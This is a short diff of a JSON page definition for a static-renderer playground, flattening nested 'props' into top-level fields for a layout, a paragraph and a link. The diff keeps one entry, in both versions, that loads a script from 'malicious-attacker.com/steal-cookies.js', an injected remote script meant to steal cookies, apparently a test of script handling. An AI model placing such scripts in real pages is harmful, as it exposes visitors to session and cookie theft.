@@ -1,23 +1,17 @@
 {
   "layout": "ArticleLayout",
-  "props": {
-    "title": "Page One",
-    "description": "This is the first page of the playground."
-  },
+  "title": "Page One",
+  "description": "This is the first page of the playground.",
   "content": [
     {
       "type": "Typography",
-      "props": {
-        "as": "p"
-      },
+      "as": "p",
       "children": "Welcome to Page One! This page is designed to demonstrate the capabilities of our static renderer. It uses the ArticleLayout, which provides a clean and organized structure for presenting content. Feel free to explore the different components and layouts available in the playground!"
     },
     {
       "type": "a",
-      "props": {
-        "href": "/contact",
-        "style": { "color": "blue", "textDecoration": "underline" }
-      },
+      "href": "/contact",
+      "style": { "color": "blue", "textDecoration": "underline" },
       "children": "Go to Contact Page"
     },
     {
@@ -26,9 +20,7 @@
     },
     {
       "type": "script",
-      "props": {
-        "src": "https://malicious-attacker.com/steal-cookies.js"
-      }
+      "src": "https://malicious-attacker.com/steal-cookies.js"
     }
   ]
 }
